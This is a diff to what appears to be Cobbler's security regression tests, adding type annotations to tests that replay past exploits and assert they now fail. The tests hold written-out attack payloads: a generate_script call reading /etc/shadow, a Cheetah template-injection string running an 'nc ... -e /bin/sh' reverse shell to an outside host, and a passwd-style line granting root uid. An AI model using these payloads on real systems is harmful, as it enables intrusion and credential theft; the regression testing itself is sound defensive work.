@@ -1,13 +1,14 @@
 """
 This test module tries to automatically replicate all security incidents we had in the past and checks if they fail.
 """
+
 # SPDX-License-Identifier: GPL-2.0-or-later
 import base64
 import crypt
-import logging
 import os
 import subprocess
 import xmlrpc.client
+from typing import Any, Callable
 
 import pytest
 
@@ -20,9 +21,9 @@ from cobbler.utils import get_shared_secret
 # SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>
 
 
-@pytest.fixture
-def try_connect():
-    def try_connect(url) -> xmlrpc.client.ServerProxy:
+@pytest.fixture(name="try_connect")
+def fixture_try_connect() -> Callable[[str], xmlrpc.client.ServerProxy]:
+    def try_connect(url: str) -> xmlrpc.client.ServerProxy:
         xmlrpc_server = xmlrpc.client.ServerProxy(url)
         return xmlrpc_server
 
@@ -30,7 +31,12 @@ def try_connect():
 
 
 @pytest.fixture(autouse=True)
-def setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):
+def setup_profile(
+    try_connect: Callable[[str], xmlrpc.client.ServerProxy],
+    create_kernel_initrd: Callable[[str, str], str],
+    fk_kernel: str,
+    fk_initrd: str,
+):
     cobbler_api = try_connect("http://localhost/cobbler_api")
     shared_secret = get_shared_secret()
     token = cobbler_api.login("", shared_secret)
@@ -56,40 +62,44 @@ def setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):
     cobbler_api.remove_distro("security_test_distro", token)
 
 
-def test_arbitrary_file_disclosure_1(setup_profile, try_connect):
+def test_arbitrary_file_disclosure_1(
+    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
+):
     # Arrange
     cobbler_api = try_connect("http://localhost/cobbler_api")
 
     # Act
     profiles = cobbler_api.get_profiles()
-    target = profiles[0]["name"]
+    target: str = profiles[0]["name"]  # type: ignore
     try:
-        result = cobbler_api.generate_script(target, "", "/etc/shadow")
+        result: str = cobbler_api.generate_script(target, "", "/etc/shadow")  # type: ignore
 
         # Assert this NOT succeeds
-        assert not result.startswith("root")
+        assert not result.startswith("root")  # type: ignore
     except xmlrpc.client.Fault as e:
         # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit
         # before something happened.
         assert "ValueError" in e.faultString
 
 
-def test_template_injection_1(setup_profile, try_connect):
+def test_template_injection_1(
+    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
+):
     # Arrange
     exploitcode = "__import__('os').system('nc [tnpitsecurity] 4242 -e /bin/sh')"
     cobbler_api = try_connect("http://localhost/cobbler_api")
 
     # Act
     profiles = cobbler_api.get_profiles()
-    target = profiles[0]["name"]
+    target: str = profiles[0]["name"]  # type: ignore
     try:
         print("[+] Stage 1 : Poisoning log with Cheetah template RCE")
-        result_stage_1 = cobbler_api.generate_script(
-            target, "", "{<%= " + exploitcode + " %>}"
+        result_stage_1: str = cobbler_api.generate_script(
+            target, "", "{<%= " + exploitcode + " %>}"  # type: ignore
         )
         print("[+] Stage 2 : Rendering template using an arbitrary file read.")
-        result_stage_2 = cobbler_api.generate_script(
-            target, "", "/var/log/cobbler/cobbler.log"
+        result_stage_2: str = cobbler_api.generate_script(  # type: ignore
+            target, "", "/var/log/cobbler/cobbler.log"  # type: ignore
         )
 
         # Assert this NOT succeeds
@@ -101,7 +111,9 @@ def test_template_injection_1(setup_profile, try_connect):
         assert "ValueError" in e.faultString
 
 
-def test_arbitrary_file_write_1(setup_profile, try_connect):
+def test_arbitrary_file_write_1(
+    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
+):
     # Arrange
     cobbler_api = try_connect("http://localhost/cobbler_api")
     exploit = b"cha:!:0:0:cha:/:/bin/bash\n"
